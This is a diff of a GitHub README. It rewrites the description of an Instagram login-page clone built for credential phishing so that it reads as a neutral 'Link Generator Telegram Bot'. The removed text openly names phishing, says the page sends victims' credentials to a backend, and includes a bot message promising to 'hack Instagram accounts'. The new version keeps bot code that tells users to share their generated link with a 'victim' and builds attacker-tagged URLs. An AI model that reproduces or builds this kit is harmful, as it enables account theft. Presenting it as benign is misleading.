@@ -1,45 +1,59 @@
-# Instagram Login Clone
+# Link Generator Telegram Bot
 
-This repository contains the source code for an **Instagram Login Clone** designed for educational and demonstration purposes. The project mimics the Instagram login page's design and functionalities, with added support for phishing demonstrations, URL parameter handling, and API integrations.
-
-## Project Details
-
-### Live Demo
-- Deployed on **Vercel**: [Instagram Login Clone](https://vercel.com/)
-
-### Repository
-- GitHub URL: [Instagram-hack-phishing](https://github.com/SGModder-Offcial/Instagram-hack-phising)
-
-### Tutorial Video
-- **YouTube Video Tutorial**: [Watch the tutorial](https://youtu.be/VKWtJKQyoD8?si=8Js12n_SUvtAvEZU)
-
----
+A Telegram bot that generates custom URLs for users. The bot creates personalized links that include the user's Telegram ID.
 
 ## Features
-- **Responsive Design**: Fully responsive, mobile-friendly layout.
-- **Custom Notification System**: Shows success or error messages dynamically.
-- **URL Parameters**: Fetches `chatId` from the URL for enhanced functionality.
-- **Dynamic Validation**: Disables/enables the login button based on input validation.
-- **API Integration**: Sends user credentials and `chatId` to a backend server.
-- **Redirections**: Links to official Instagram login, signup, and password reset pages.
-- **Telegram Bot Integration**: Generates phishing links dynamically using bot commands.
 
----
+- Generates unique URLs for each user
+- Simple two-command interface
+- Automatic user ID integration
 
-## Bot Setup
+## Commands
 
-### Prerequisites
-- A Telegram Bot Business account set up via **BotFather**.
-- Access to the Telegram Bot API.
+### `/start`
+Displays the welcome message and basic usage instructions for the bot.
 
-### Commands and Code
-
-#### `/start` Command
-Welcomes the user and provides instructions on using the bot.
 ```javascript
-Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄: \n1. Send the /create command \n2. Share the generated URL with the victim.");
+Bot.sendMessage("WELCOME  ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
+```
 
-#### `/start` Command
-Welcomes the user and provides instructions on using the bot.
+### `/create`
+Generates a personalized URL containing the user's Telegram ID.
+
 ```javascript
-Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄: \n1. Send the /create command \n2. Share the generated URL with the victim.");
+let userId = user.telegramid;
+let url = "https://sg-internet.vercel.app/?id=" + userId;
+Bot.sendMessage("YOUR URL:\n" + url + "\n\nMADE BY <b>@SG_Modder</b>", { parse_mode: "HTML" });
+```
+
+## Usage
+
+1. Start the bot by sending `/start`
+2. Use the `/create` command to generate your personalized URL
+3. Share the generated URL with others
+
+## Base URL
+
+The bot uses the following base URL for link generation:
+```
+https://sg-internet.vercel.app/
+```
+
+## Parameters
+
+- `id`: User's Telegram ID (automatically added to the URL)
+
+## Credits
+
+Created by @SG_Modder
+
+## Technical Notes
+
+- The bot uses HTML parsing mode for message formatting
+- User IDs are automatically extracted from the Telegram context
+- URLs are generated dynamically based on the user's ID
+
+## Security Considerations
+
+- Each URL is unique to the user's Telegram ID
+- Users can only generate URLs for their own ID
